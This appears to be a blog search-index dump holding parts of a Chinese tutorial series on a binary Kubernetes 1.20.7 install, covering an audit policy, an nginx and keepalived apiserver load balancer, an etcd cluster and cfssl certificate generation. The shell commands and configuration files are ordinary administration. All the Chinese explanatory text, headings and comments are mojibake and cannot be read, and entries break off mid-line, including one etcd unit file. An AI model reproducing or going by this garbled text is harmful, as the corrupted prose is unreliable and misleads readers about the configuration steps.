group: \"\" # core resources: [\"endpoints\"] - level: None users: [\"system:apiserver\"] verbs: [\"get\"] resources: - group: \"\" # core resources: [\"namespaces\", \"namespaces/status\", \"namespaces/finalize\"] - level: None users: [\"cluster-autoscaler\"] verbs: [\"get\", \"update\"] namespaces: [\"kube-system\"] resources: - group: \"\" # core resources: [\"configmaps\", \"endpoints\"] # Don't log HPA fetching metrics. - level: None users: - system:kube-controller-manager verbs: [\"get\", \"list\"] resources: - group: \"metrics.k8s.io\" # Don't log these read-only URLs. - level: None nonResourceURLs: - /healthz* - /version - /swagger* # Don't log events requests because of performance impact. - level: None resources: - group: \"\" # core resources: [\"events\"] # node and pod status calls from nodes are high-volume and can be large, don't log responses for expected updates from nodes - level: Request users: [\"kubelet\", \"system:node-problem-detector\", \"system:serviceaccount:kube-system:node-problem-detector\"] verbs: [\"update\",\"patch\"] resources: - group: \"\" # core resources: [\"nodes/status\", \"pods/status\"] omitStages: - \"RequestReceived\" - level: Request userGroups: [\"system:nodes\"] verbs: [\"update\",\"patch\"] resources: - group: \"\" # core resources: [\"nodes/status\", \"pods/status\"] omitStages: - \"RequestReceived\" # deletecollection calls can be large, don't log responses for expected namespace deletions - level: Request users: [\"system:serviceaccount:kube-system:namespace-controller\"] verbs: [\"deletecollection\"] omitStages: - \"RequestReceived\" # Secrets, ConfigMaps, TokenRequest and TokenReviews can contain sensitive \u0026 binary data, # so only log at the Metadata level. - level: Metadata resources: - group: \"\" # core resources: [\"secrets\", \"configmaps\", \"serviceaccounts/token\"] - group: authentication.k8s.io resources: [\"tokenreviews\"] omitStages: - \"RequestReceived\" # Get responses can be large; skip them. - level: Request verbs: [\"get\", \"list\", \"watch\"] resources: - group: \"\" # core - group: \"admissionregistration.k8s.io\" - group: \"apiextensions.k8s.io\" - group: \"apiregistration.k8s.io\" - group: \"apps\" - group: \"authentication.k8s.io\" - group: \"authorization.k8s.io\" - group: \"autoscaling\" - group: \"batch\" - group: \"certificates.k8s.io\" - group: \"extensions\" - group: \"metrics.k8s.io\" - group: \"networking.k8s.io\" - group: \"no","date":"2021-06-17 15:25","objectID":"/post/2473/:0:1","tags":["nginx","keepalievd","k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-apiserver+nginx+keepalived(äº”) ","uri":"/post/2473/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"äºŒã€å®‰è£…é…ç½®nginx 1. å®‰è£… mkdir /server/packages/ -p cd /server/packages/ wget http://nginx.org/download/nginx-1.16.1.tar.gz tar xf nginx-1.16.1.tar.gz cd nginx-1.16.1/ ./configure --prefix=/usr/local/nginx --with-stream --without-http --without-http_uwsgi_module ç¼–è¯‘å‚æ•°è¯´æ˜: --with-stream: å¼€å¯tcp/udpä»£ç† --without-http: ç¦ç”¨httpæœåŠ¡å™¨ --without-http_uwsgi_module: ç¦ç”¨uwsgiä¼ è¾“åŠŸèƒ½ 2.é…ç½® ä¸¤å°nginxç›¸åŒ cat \u003e /usr/local/nginx/conf/nginx.conf \u003c\u003cEOF worker_processes auto; error_log logs/error.log; pid logs/nginx.pid; events { worker_connections 1024; } stream { log_format main '$remote_addr [$time_local] ' '$protocol $status $bytes_sent $bytes_received ' '$session_time \"$upstream_addr\" ' '\"$upstream_bytes_sent\" \"$upstream_bytes_received\" \"$upstream_connect_time\"'; access_log logs/access.log main; upstream kube-apiserver { hash $remote_addr consistent; server 172.17.20.201:6443 max_fails=3 fail_timeout=10s; server 172.17.20.202:6443 max_fails=3 fail_timeout=10s; server 172.17.20.203:6443 max_fails=3 fail_timeout=10s; } server { listen 6443; proxy_connect_timeout 1s; proxy_pass kube-apiserver; } } EOF 3.å¯åŠ¨æœåŠ¡ /usr/local/nginx/sbin/nginx ","date":"2021-06-17 15:25","objectID":"/post/2473/:0:2","tags":["nginx","keepalievd","k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-apiserver+nginx+keepalived(äº”) ","uri":"/post/2473/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"ä¸‰ã€å®‰è£…keepalived 1. å®‰è£… yum install -y keepalived 2.é…ç½® nginx01çš„keepalived cat \u003e /etc/keepalived/keepalived.conf \u003c\u003cEOF global_defs { router_id nginx01 } # å®šä¹‰ä¸€ä¸ªçŠ¶æ€æ£€æŸ¥,scriptä¸­ä¹Ÿå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬ï¼Œä½†è„šæœ¬éœ€æœ‰è¿”å›å€¼ vrrp_script check_nginx { # æ¯2ç§’æ£€æŸ¥ä¸€æ¬¡nginxè¿›ç¨‹çŠ¶æ€ï¼Œæ ¹æ®å‘½ä»¤æ‰§è¡Œçš„çŠ¶æ€ç å»åˆ¤æ–­æœåŠ¡æ˜¯å¦æ­£å¸¸ script \"/usr/bin/killall -0 nginx\" interval 2 # 2æ¬¡çŠ¶æ€å—ä¸ºé0æ‰ä¸ºå¤±è´¥çŠ¶æ€ fall 2 # 2æ¬¡çŠ¶æ€ç ä¸º0æ‰ä¸ºæ­£å¸¸çŠ¶æ€ rise 2 } vrrp_instance nginx { # è®¾ç½®ä¸ºmaster state MASTER # æŒ‡å®švipç»‘å®šç½‘å¡ interface eth0 # vrrpæ ‡è¯†1-255(éœ€è¦å’Œå¤‡èŠ‚ç‚¹ä¸€è‡´) virtual_router_id 51 # æŒ‡å®šä¼˜å…ˆçº§ï¼Œä¼˜å…ˆçº§é«˜çš„ä¼šä¼˜å…ˆæˆä¸ºmaster priority 100 # ç»„æ’­åŒ…é—´éš”æ—¶é—´ advert_int 1 # è®¤è¯ authentication { auth_type PASS auth_pass 1111 } # é…ç½®vip virtual_ipaddress { 172.17.20.200 } # å¼•ç”¨ä¸Šé¢å®šä¹‰çš„çŠ¶æ€æ£€æŸ¥ track_script { check_nginx } } EOF nginx02çš„keepalived cat \u003e /etc/keepalived/keepalived.conf \u003c\u003cEOF global_defs { router_id nginx02 } # å®šä¹‰ä¸€ä¸ªçŠ¶æ€æ£€æŸ¥,scriptä¸­ä¹Ÿå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬ï¼Œä½†è„šæœ¬éœ€æœ‰è¿”å›å€¼ vrrp_script check_nginx { # æ¯2ç§’æ£€æŸ¥ä¸€æ¬¡nginxè¿›ç¨‹çŠ¶æ€ï¼Œæ ¹æ®å‘½ä»¤æ‰§è¡Œçš„çŠ¶æ€ç å»åˆ¤æ–­æœåŠ¡æ˜¯å¦æ­£å¸¸ script \"/usr/bin/killall -0 nginx\" interval 2 # 2æ¬¡çŠ¶æ€å—ä¸ºé0æ‰ä¸ºå¤±è´¥çŠ¶æ€ fall 2 # 2æ¬¡çŠ¶æ€ç ä¸º0æ‰ä¸ºæ­£å¸¸çŠ¶æ€ rise 2 } vrrp_instance nginx { # è®¾ç½®ä¸ºmaster state BACKUP # æŒ‡å®švipç»‘å®šç½‘å¡ interface eth0 # vrrpæ ‡è¯†1-255(éœ€è¦å’Œå¤‡èŠ‚ç‚¹ä¸€è‡´) virtual_router_id 51 # æŒ‡å®šä¼˜å…ˆçº§ï¼Œä¼˜å…ˆçº§é«˜çš„ä¼šä¼˜å…ˆæˆä¸ºmaster priority 99 # ç»„æ’­åŒ…é—´éš”æ—¶é—´ advert_int 1 # è®¤è¯ authentication { auth_type PASS auth_pass 1111 } # é…ç½®vip virtual_ipaddress { 172.17.20.200 } # å¼•ç”¨ä¸Šé¢å®šä¹‰çš„çŠ¶æ€æ£€æŸ¥ track_script { check_nginx } } EOF 3.å¯åŠ¨æœåŠ¡ systemctl start keepalived systemctl enable keepalived 4.éªŒè¯vipæ¼‚ç§» åœæ­¢nginx01çš„keepalived,è§‚å¯Ÿvipæ˜¯å¦ä¼šæ¼‚ç§»åˆ°nginx02ä¸Š å¯åŠ¨nginx01çš„keepalived,è§‚å¯Ÿvipæ˜¯å¦ä¼šæ¼‚ç§»åˆ°nginx01ä¸Š(å½“å‰é…ç½®æ˜¯æŠ¢å æ¨¡å¼ï¼Œnginx01æ¢å¤åä¼šæŠ¢å VIP) ","date":"2021-06-17 15:25","objectID":"/post/2473/:0:3","tags":["nginx","keepalievd","k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-apiserver+nginx+keepalived(äº”) ","uri":"/post/2473/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"ä¸€ã€ä¸‹è½½äºŒè¿›åˆ¶åŒ… mkdir /server/packages/ -p cd /server/packages/ # ä¸‹è½½ wget https://github.91chifun.workers.dev/https://github.com//etcd-io/etcd/releases/download/v3.4.16/etcd-v3.4.16-linux-amd64.tar.gz # åˆ†å‘åˆ°å…¶ä»–æœºå™¨ for i in {202..203};do scp etcd-v3.4.16-linux-amd64.tar.gz 172.17.20.$i:`pwd` ;done ","date":"2021-06-16 10:46","objectID":"/post/2467/:0:1","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-etcdé«˜å¯ç”¨éƒ¨ç½²(å››)","uri":"/post/2467/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"äºŒã€å®‰è£…etcd # ä¸‰å°æ‰§è¡Œ cd /server/packages/ tar xf etcd-v3.4.16-linux-amd64.tar.gz mv etcd-v3.4.16-linux-amd64/etcd* /usr/local/bin/ # åˆ›å»ºç›¸å…³ç›®å½• mkdir /data/etcd/{data,wal} -p ","date":"2021-06-16 10:46","objectID":"/post/2467/:0:2","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-etcdé«˜å¯ç”¨éƒ¨ç½²(å››)","uri":"/post/2467/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"ä¸‰ã€åˆ†å‘è¯ä¹¦ for i in {202..203};do scp -r /etc/kubernetes/ 172.17.20.$i:/etc/kubernetes/ ;done ","date":"2021-06-16 10:46","objectID":"/post/2467/:0:3","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-etcdé«˜å¯ç”¨éƒ¨ç½²(å››)","uri":"/post/2467/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"å››ã€åˆ›å»ºsystemdå¯åŠ¨è„šæœ¬ cat \u003e /etc/systemd/system/etcd.service \u003c\u003cEOF [Unit] Description=Etcd Server After=network.target After=network-online.target Wants=network-online.target Documentation=https://github.com/coreos [Service] Type=notify WorkingDirectory=/data/etcd/data/ ExecStart=/usr/local/bin/etcd \\\\ --name=etcd01 \\\\ --data-dir=/data/etcd/data/ \\\\ --wal-dir=/data/etcd/wal \\\\ --heartbeat-interval=200 \\\\ --election-timeout=1500 \\\\ --listen-peer-urls=https://172.17.20.201:2380 \\\\ --listen-client-urls=https://172.17.20.201:2379 \\\\ --initial-advertise-peer-urls=https://172.17.20.201:2380 \\\\ --advertise-client-urls=https://172.17.20.201:2379 \\\\ --initial-cluster=etcd01=https://172.17.20.201:2380,etcd02=https://172.17.20.202:2380,etcd03=https://172.17.20.203:2380 \\\\ --initial-cluster-state=new \\\\ --initial-cluster-token=k8s-etcd-cluster \\\\ --cert-file=/etc/kubernetes/pki/etcd/etcd.pem \\\\ --key-file=/etc/kubernetes/pki/etcd/etcd-key.pem \\\\ --client-cert-auth \\\\ --trusted-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --peer-cert-file=/etc/kubernetes/pki/etcd/etcd.pem \\\\ --peer-key-file=/etc/kubernetes/pki/etcd/etcd-key.pem \\\\ --peer-client-cert-auth \\\\ --peer-trusted-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --enable-v2=true \\\\ --logger=zap \\\\ --log-level=info Restart=on-failure RestartSec=5 LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF å¦‚æœä½ çœ‹æ‡‚äº†ä¸‹é¢çš„å‚æ•°ä»‹ç»ï¼Œç›¸ä¿¡ä½ å¯ä»¥å†™å‡ºå…¶ä»–ä¸¤å°etcdèŠ‚ç‚¹çš„å‚æ•°é…ç½® å‚æ•°ç®€ä»‹ --name: èŠ‚ç‚¹åç§° --data-dir: æ•°æ®å­˜å‚¨ç›®å½• --wal-dir: walé¢„å†™æ—¥å¿—ï¼Œæ‰€æœ‰çš„ä¿®æ”¹åœ¨æäº¤ä¹‹å‰éƒ½è¦å…ˆå†™å…¥logæ–‡ä»¶ä¸­ã€‚é»˜è®¤è·¯å¾„åœ¨â€“data-dirç›®å½•ä¸‹ --heartbeat-interval: å¿ƒè·³é—´éš”æ—¶é—´(æ¯«ç§’)ã€‚leaderé€šçŸ¥æ‰€æœ‰çš„followersï¼Œä»–è¿˜æ˜¯Leaderçš„æ—¶é—´é—´éš”ã€‚é»˜è®¤100ms --election-timeout: é€‰ä¸¾è¶…æ—¶çš„æ—¶é—´(æ¯«ç§’)ã€‚è¡¨ç¤ºfolloweråœ¨å¤šä¹…åè¿˜æ²¡æœ‰æ”¶åˆ°leaderçš„å¿ƒè·³ï¼Œä»–å°±ç”³è¯·é€‰ä¸¾è‡ªå·±ä¸ºLeaderã€‚é»˜è®¤1000msã€‚å…³äºraftåŠ¨ç”»ä»‹ç»: http://thesecretlivesofdata.com/raft --listen-peer-urls: ç›‘å¬åœ°å€ï¼Œä¸é›†ç¾¤å…¶å®ƒæˆå‘˜é€šä¿¡çš„åœ°å€ã€‚ --listen-client-urls: ç›‘å¬åœ°å€ï¼Œä¸å®¢æˆ·ç«¯é€šä¿¡çš„åœ°å€ã€‚ --initial-advertise-peer-urls: å‘é›†ç¾¤ä¸­å…¶ä»–æˆå‘˜é€šå‘Šè‡ªå·±çš„åœ°å€ï¼Œå¯¹åº”--listen-peer-urls --advertise-client-urls: å‘å®¢æˆ·ç«¯é€šå‘Šè‡ªå·±çš„åœ°å€ï¼Œå¯¹åº”--listen-client-urlsã€‚è¿™é‡Œæœ‰ä¸€ä¸ªåŠ©äºç†è§£çš„æ–‡æ¡£ï¼šhttps://www.jianshu.com/p/7bbef1ca9733 --initial-cluster: æŒ‡å®šä¸é›†ç¾¤ä¸­å…¶ä»–æˆå‘˜çš„é€šä¿¡åœ°å€(æ‰€æœ‰èŠ‚ç‚¹çš„åœ°å€)ã€‚å½¢å¼ä¸º:name=http://xxxx:2380,nameä»£è¡¨--nameæŒ‡å®šçš„å€¼ --initial-cluster-state: æŒ‡å®šnewæˆ–existing.å‰è€…ä¸ºåˆå§‹åŒ–æ–°çš„é›†ç¾¤ï¼Œåè€…ä»£è¡¨åŠ å…¥ç°æœ‰é›†ç¾¤ --initial-cluster-token: å¼•å¯¼æœŸé—´etcdé›†ç¾¤çš„åˆå§‹é›†ç¾¤ä»¤ç‰Œ,åŒä¸€ä¸ªé›†ç¾¤ä»¤ç‰Œä¸€è‡´ã€‚ --cert-file: æœåŠ¡ç«¯è¯ä¹¦ --key-file: æœåŠ¡ç«¯è¯ä¹¦ç§é’¥ --client-cert-auth: å¯ç”¨å®¢æˆ·ç«¯è¯ä¹¦è®¤è¯ --trusted-ca-file: æŒ‡å®šä¿¡ä»»çš„CA(æ ¡éªŒå®¢æˆ·ç«¯è¯ä¹¦) --peer-cert-file: é›†ç¾¤é—´é€šä¿¡çš„è¯ä¹¦ --peer-key-file: é›†ç¾¤é—´é€šä¿¡çš„è¯ä¹¦ç§é’¥ --peer-client-cert-auth: å¯ç”¨é›†ç¾¤é—´é€šä¿¡è¯ä¹¦è®¤è¯ --peer-trusted-ca-file: æŒ‡å®šä¿¡ä»»çš„CA(æ ¡éªŒé›†ç¾¤é—´é€šä¿¡è¯ä¹¦) --enable-v2: å¯ç”¨v2ç‰ˆæœ¬api --logger: æŒ‡å®šæ—¥å¿—å™¨ï¼Œé»˜è®¤capnslog,åœ¨3.5ç‰ˆæœ¬ä¸­å·²å¼ƒç”¨ã€‚å¯é€‰é¡¹zapæ˜¯ç»“æ„åŒ–æ—¥å¿—ã€‚ --log-level: æ—¥å¿—çº§åˆ«ï¼Œå¯é€‰é¡¹debug, info, warn, error, panic, fatalã€‚é»˜è®¤info å…¶ä»–etcdèŠ‚ç‚¹é…ç½® etcd02 cat \u003e /etc/systemd/system/etcd.service \u003c\u003cEOF [Unit] Description=Etcd Server After=network.target After=network-online.target Wants=network-online.target Documentation=https://github.com/coreos [Service] Type=notify WorkingDirectory=/data/etcd/data/ ExecStart=/usr/local/bin/etcd \\\\ --name=etcd02 \\\\ --data-dir=/data/etcd/data/ \\\\ --wal-dir=/data/etcd/wal \\\\ --heartbeat-interval=200 \\\\ --election-timeout=1500 \\\\ --listen-peer-urls=https://172.17.20.202:2380 \\\\ --listen-client-urls=https://172.17.20.202:2379 \\\\ --initial-advertise-peer-urls=https://172.17.20.202:2380 \\\\ --advertise-client-urls=https://172.17.20.202:2379 \\\\ --initial-cluster=etcd01=https://172.17.20.201:2380,etcd02=https://172.17.20.202:2380,etcd03=https://172.17.20.203:2380 \\\\ --initial-cluster-state=new \\\\ --initial-cluster-token=k8s-etcd-cluster \\\\ --cert-file=/etc/kubernetes/pki/etcd/etcd.pem \\\\ --key-file=/etc/kubernetes/pki/etcd/etcd-key.pem \\\\ --client-cert-auth \\\\ --trusted-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --peer-cert-file=/etc/kubernetes/pki/etcd/etcd.pem \\\\ --peer-key-file=/etc/kubernetes/pki/etcd/etcd-key.pem \\\\ --peer-client-cert-auth \\\\ --peer-trusted-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --enable-v2=true \\\\ --logger=zap \\\\ --log-level=info Restart=on-failure RestartSec=5 LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF etcd03 cat \u003e /etc/systemd/system/etcd.service \u003c\u003cEOF [Unit] Description=Etcd Server After=network.target A","date":"2021-06-16 10:46","objectID":"/post/2467/:0:4","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-etcdé«˜å¯ç”¨éƒ¨ç½²(å››)","uri":"/post/2467/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"å››ã€å¯åŠ¨æœåŠ¡ systemctl start etcd systemctl enable etcd ","date":"2021-06-16 10:46","objectID":"/post/2467/:0:5","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-etcdé«˜å¯ç”¨éƒ¨ç½²(å››)","uri":"/post/2467/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"äº”ã€æŸ¥çœ‹èŠ‚ç‚¹çŠ¶æ€ for i in {201..203};do \\ ETCDCTL_API=3 etcdctl \\ --endpoints=https://172.17.20.$i:2379 \\ --cacert=/etc/kubernetes/pki/ca/ca.pem \\ --cert=/etc/kubernetes/pki/etcd/etcd.pem \\ --key=/etc/kubernetes/pki/etcd/etcd-key.pem endpoint health \\ ;done 67653-c2qvr56o7ha.png ","date":"2021-06-16 10:46","objectID":"/post/2467/:0:6","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-etcdé«˜å¯ç”¨éƒ¨ç½²(å››)","uri":"/post/2467/"},{"categories":["ç³»ç»ŸæœåŠ¡","kubernetes"],"content":"å…­ã€æŸ¥çœ‹é›†ç¾¤çŠ¶æ€ ETCDCTL_API=3 etcdctl \\ -w table \\ --endpoints=https://172.17.20.201:2379,https://172.17.20.202:2379,https://172.17.20.203:2379 \\ --cacert=/etc/kubernetes/pki/ca/ca.pem --cert=/etc/kubernetes/pki/etcd/etcd.pem \\ --key=/etc/kubernetes/pki/etcd/etcd-key.pem endpoint status 23477-u5g7bmvnx7.png ","date":"2021-06-16 10:46","objectID":"/post/2467/:0:7","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-etcdé«˜å¯ç”¨éƒ¨ç½²(å››)","uri":"/post/2467/"},{"categories":["kubernetes"],"content":"ä¸€ã€ä¸‹è½½å®‰è£…cfsslå·¥å…· wget -O /usr/local/bin/cfssl https://github.com/cloudflare/cfssl/releases/download/v1.6.0/cfssl_1.6.0_linux_amd64 wget -O /usr/local/bin/cfssljson https://github.com/cloudflare/cfssl/releases/download/v1.6.0/cfssljson_1.6.0_linux_amd64 wget -O /usr/local/bin/cfssl-certinfo https://github.com/cloudflare/cfssl/releases/download/v1.6.0/cfssl-certinfo_1.6.0_linux_amd64 chmod +x /usr/local/bin/cfssl* ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-ä½¿ç”¨cfsslç”Ÿæˆé…ç½®è¯ä¹¦(ä¸‰)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"äºŒã€é…ç½®å·¥ä½œç›®å½• mkdir /etc/kubernetes/pki/{ca,etcd} -p cd /etc/kubernetes/pki/ca ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-ä½¿ç”¨cfsslç”Ÿæˆé…ç½®è¯ä¹¦(ä¸‰)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"ä¸‰ã€é…ç½®CAæœºæ„ 1.ç”Ÿæˆè‡ªç­¾CA # åˆ›å»ºè‡ªç­¾è¯ä¹¦è¯·æ±‚é…ç½®æ–‡ä»¶ cat \u003e ca-csr.json \u003c\u003cEOF { \"ca\": { \"expiry\": \"438000h\" }, \"CN\": \"kubernetes\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF # ç”Ÿæˆcaçš„è¯ä¹¦ç­¾åè¯·æ±‚æ–‡ä»¶ã€caç§é’¥ã€caè¯ä¹¦ cfssl gencert -initca ca-csr.json | cfssljson -bare ca ca.expiry:: caè¯ä¹¦çš„è¿‡æœŸæ—¶é—´ï¼Œé»˜è®¤5å¹´ï¼Œæˆ‘æ”¹æˆäº†50å¹´ CN: Common Nameï¼Œkube-apiserver ä»è¯ä¹¦ä¸­æå–è¯¥å­—æ®µä½œä¸ºè¯·æ±‚çš„ç”¨æˆ·å (User Name)ï¼›æµè§ˆå™¨ä½¿ç”¨è¯¥å­—æ®µéªŒè¯ç½‘ç«™æ˜¯å¦åˆæ³•ï¼› O: Organizationï¼Œkube-apiserver ä»è¯ä¹¦ä¸­æå–è¯¥å­—æ®µä½œä¸ºè¯·æ±‚ç”¨æˆ·æ‰€å±çš„ç»„ (Group) C: å›½å®¶ ST: çœä»½ L: åŸå¸‚ 2.å‡†å¤‡CAç”¨äºç­¾å‘çš„é…ç½®æ–‡ä»¶ åé¢ä½¿ç”¨çš„è¯ä¹¦éƒ½ä¼šä½¿ç”¨æˆ‘ä»¬ä¹‹å‰ç”Ÿæˆçš„CAæ¥é¢å‘ï¼Œä¸‹é¢æ˜¯é¢å‘è¯ä¹¦æ—¶çš„é»˜è®¤é…ç½® cat \u003e ca-config.json \u003c\u003c EOF { \"signing\": { \"default\": { \"expiry\": \"87600h\" }, \"profiles\": { \"kubernetes\": { \"expiry\": \"87600h\", \"usages\": [ \"signing\", \"key encipherment\", \"server auth\", \"client auth\" ] } } } } EOF default.expiry: å…¨å±€é…ç½®ï¼Œé¢å‘çš„è¯ä¹¦é»˜è®¤æœ‰æ•ˆæœŸ10å¹´ profilesä¸­å¯ä»¥å®šä¹‰å¤šä¸ªé…ç½®ï¼Œè¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªkubernetesï¼Œåœ¨ä½¿ç”¨çš„æ—¶å€™å¯ä»¥æŒ‡å®šprofileã€‚ä¾‹å¦‚: -config=ca-config.json -profile=kubernetes ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-ä½¿ç”¨cfsslç”Ÿæˆé…ç½®è¯ä¹¦(ä¸‰)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"å››ã€ç­¾å‘etcdè¯ä¹¦ 1.åˆ›å»ºè¯ä¹¦è¯·æ±‚é…ç½®æ–‡ä»¶ cd /etc/kubernetes/pki/etcd/ cat \u003e etcd-csr.json \u003c\u003cEOF { \"CN\": \"etcd\", \"hosts\": [ \"127.0.0.1\", \"172.17.20.201\", \"172.17.20.202\", \"172.17.20.203\" ], \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF è¿™é‡Œçš„hostsä¹Ÿå¯ä»¥æ”¹æˆåŸŸåã€ä¼šçµæ´»ä¸€äº›ï¼Œæ›´æ¢IPä¹Ÿä¸å½±å“è¯ä¹¦ä½¿ç”¨ 2.ç­¾å‘è¯ä¹¦ cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./etcd-csr.json | cfssljson -bare etcd ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:4","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-ä½¿ç”¨cfsslç”Ÿæˆé…ç½®è¯ä¹¦(ä¸‰)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"äº”.ç­¾å‘apiserverè¯ä¹¦ apiserveræœåŠ¡ç«¯è¯ä¹¦ï¼Œç”¨äºè¯æ˜è‡ªå·±æ˜¯apiserverèº«ä»½çš„ã€‚ï¼ˆé€šè¿‡hostsç¡®è®¤ï¼‰ 1.åˆ›å»ºè¯ä¹¦è¯·æ±‚é…ç½®æ–‡ä»¶ cd /etc/kubernetes/pki/ cat \u003e apiserver-csr.json \u003c\u003cEOF { \"CN\": \"kubernetes\", \"hosts\": [ \"127.0.0.1\", \"172.17.20.201\", \"172.17.20.202\", \"172.17.20.203\", \"172.17.20.200\", \"10.1.0.1\", \"kubernetes\", \"kubernetes.default\", \"kubernetes.default.svc\", \"kubernetes.default.svc.cluster\", \"kubernetes.default.svc.cluster.local\" ], \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF hostséœ€è¦å¡«å†™masterèŠ‚ç‚¹åœ°å€å’Œvip,é›†ç¾¤å†…éƒ¨é€šä¿¡ä¼šç”¨å†…éƒ¨åœ°å€,æ‰€ä»¥ä¹Ÿéœ€è¦å†™ä¸Šservice ipä»¥åŠå†…éƒ¨åŸŸåã€‚ 2.ç­¾å‘è¯ä¹¦ cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./apiserver-csr.json | cfssljson -bare apiserver ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:5","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-ä½¿ç”¨cfsslç”Ÿæˆé…ç½®è¯ä¹¦(ä¸‰)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"äº”.ç­¾å‘controller-managerè¯ä¹¦ controller-managerä½œä¸ºapiserverçš„å®¢æˆ·ç«¯ï¼Œè¿™é‡Œé…ç½®çš„æ˜¯å®¢æˆ·ç«¯è¯ä¹¦,åŒ…å«äº†å®¢æˆ·ç«¯çš„ä¿¡æ¯ã€‚ï¼ˆCNä»£è¡¨ç”¨æˆ·ï¼‰ 1.åˆ›å»ºè¯ä¹¦è¯·æ±‚é…ç½®æ–‡ä»¶ cd /etc/kubernetes/pki/ cat \u003e kube-controller-manager.json \u003c\u003cEOF { \"CN\": \"system:kube-controller-manager\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"hosts\": [ \"127.0.0.1\", \"172.17.20.201\", \"172.17.20.202\", \"172.17.20.203\" ], \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF k8sæœ‰ä¸€ä¸ªå†…ç½®çš„ClusterRoleBindingåä¸ºsystem:kube-controller-managerã€‚ è¿™ä¸ªclusterrolebindingå°†system:kube-controller-managerè¿™ä¸ªclusterroleä¸ç”¨æˆ·system:kube-controller-managerç»‘å®š k8sé€šè¿‡è¯ä¹¦ä¸­çš„CNè·å–ç”¨æˆ·å,æ‰€ä»¥æŒ‡å®šCNä¸ºsystem:kube-controller-managerä½œä¸ºç”¨æˆ·å,å¹¶ä¸”è¯ä¹¦æ˜¯ç”±CAç­¾åè¿‡çš„ï¼Œæ‰€ä»¥CNæŒ‡å®šçš„ç”¨æˆ·åæ˜¯å¯ä¿¡çš„ã€‚ å¦‚æœéƒ¨ç½²å®Œåä½ æƒ³æŸ¥çœ‹ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤:k get ClusterRolebinding system:kube-controller-manager -o yaml å®˜æ–¹è¯´æ˜ï¼šhttps://kubernetes.io/zh/docs/setup/best-practices/certificates/#%E4%B8%BA%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E9%85%8D%E7%BD%AE%E8%AF%81%E4%B9%A6 